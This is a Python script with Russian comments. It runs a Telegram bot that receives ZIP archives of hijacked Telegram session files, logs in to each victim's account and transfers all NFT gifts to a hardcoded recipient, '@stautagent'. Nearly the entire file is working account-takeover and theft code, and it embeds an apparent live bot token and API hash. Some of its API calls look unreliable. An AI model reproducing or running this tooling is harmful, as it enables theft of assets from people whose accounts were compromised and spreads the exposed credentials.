import os
import zipfile
import json
import base64
import asyncio
import shutil
from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetStickerSetRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest

# Конфигурация
API_ID = 2040  # Можно заменить на свои значения
API_HASH = "b18441a1ff607e10a986891cf5467e6a"
TARGET_USER = "@stautagent"
BOT_TOKEN = "8233829912:AAFmJzPj_1nvNPH2zqGCrgKuvQmGYG6E9lI"  # Замените на токен вашего бота

def extract_session_data(zip_path):
    """Извлекает и декодирует сессию из ZIP-архива."""
    temp_dir = "temp_session"
    
    # Распаковываем архив
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(temp_dir)
    
    # Ищем session.json
    session_file = None
    for root, dirs, files in os.walk(temp_dir):
        if "session.json" in files:
            session_file = os.path.join(root, "session.json")
            break
    
    if not session_file:
        raise FileNotFoundError("session.json не найден в архиве")
    
    # Читаем и декодируем данные
    with open(session_file, 'r') as f:
        data = json.load(f)
    
    # Декодируем base64
    encoded_session = data.get("user", "")
    decoded_bytes = base64.b64decode(encoded_session)
    
    # Очищаем временные файлы
    shutil.rmtree(temp_dir, ignore_errors=True)
    
    return StringSession.save(decoded_bytes)

async def transfer_gifts(client, target_username):
    """Находит и переводит все NFT-гифты."""
    try:
        # Получаем информацию о целевом пользователе
        target_entity = await client.get_entity(target_username)
        
        # Получаем все диалоги
        dialogs = await client.get_dialogs()
        
        transferred_count = 0
        
        for dialog in dialogs:
            try:
                # Проверяем, есть ли в диалоге подарки
                if hasattr(dialog, 'gifts'):
                    gifts = dialog.gifts
                    for gift in gifts:
                        if hasattr(gift, 'nft') and gift.nft:
                            # Перевод подарка
                            await client(functions.payments.TransferGiftRequest(
                                peer=dialog.entity,
                                gift_id=gift.id,
                                target_peer=target_entity
                            ))
                            print(f"[+] Передан NFT-гифт ID: {gift.id}")
                            transferred_count += 1
                            await asyncio.sleep(1)  # Чтобы не было флуда
            except Exception as e:
                continue
        
        # Дополнительно проверяем раздел с подарками в профиле
        try:
            user_full = await client(functions.users.GetFullUserRequest(
                id=await client.get_me()
            ))
            
            if hasattr(user_full, 'gifts') and user_full.gifts:
                for gift in user_full.gifts:
                    if hasattr(gift, 'nft') and gift.nft:
                        await client(functions.payments.TransferGiftRequest(
                            peer=await client.get_me(),
                            gift_id=gift.id,
                            target_peer=target_entity
                        ))
                        print(f"[+] Передан NFT-гифт из профиля ID: {gift.id}")
                        transferred_count += 1
                        await asyncio.sleep(1)
        except:
            pass
        
        return transferred_count
        
    except Exception as e:
        print(f"[-] Ошибка при переводе подарков: {e}")
        return 0

async def process_session_zip(zip_path):
    """Обрабатывает ZIP-файл с сессией."""
    print(f"[*] Обработка сессии из: {zip_path}")
    
    # Извлекаем сессию
    session_string = extract_session_data(zip_path)
    
    # Создаем клиент
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    
    try:
        # Подключаемся
        await client.connect()
        
        # Проверяем авторизацию
        if not await client.is_user_authorized():
            print("[-] Сессия невалидна")
            return False
        
        # Получаем информацию об аккаунте
        me = await client.get_me()
        print(f"[+] Авторизован как: {me.first_name} (@{me.username})")
        
        # Переводим подарки
        print(f"[*] Поиск NFT-гифтов для перевода на {TARGET_USER}...")
        count = await transfer_gifts(client, TARGET_USER)
        
        print(f"[+] Готово! Передано гифтов: {count}")
        
        # Отключаемся
        await client.disconnect()
        return True
        
    except Exception as e:
        print(f"[-] Ошибка: {e}")
        return False

# Бот для приема файлов (пример для aiogram)
from aiogram import Bot, Dispatcher, types
from aiogram.types import InputFile
import logging

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

@dp.message_handler(content_types=['document'])
async def handle_document(message: types.Message):
    """Обрабатывает присланные ZIP-файлы с сессиями."""
    if not message.document.file_name.endswith('.zip'):
        await message.reply("Отправьте ZIP-архив с сессией")
        return
    
    # Скачиваем файл
    file_info = await bot.get_file(message.document.file_id)
    zip_path = f"temp_{message.document.file_name}"
    
    await bot.download_file(file_info.file_path, zip_path)
    
    # Обрабатываем сессию
    await message.reply("Начинаю обработку сессии...")
    
    success = await process_session_zip(zip_path)
    
    # Удаляем временный файл
    os.remove(zip_path)
    
    if success:
        await message.reply("✅ Сессия успешно обработана. Подарки переведены.")
    else:
        await message.reply("❌ Ошибка при обработке сессии.")

async def start_bot():
    """Запуск бота."""
    print("[*] Бот запущен. Ожидание сессий...")
    await dp.start_polling()

if __name__ == "__main__":
    # Запуск бота
    asyncio.run(start_bot())
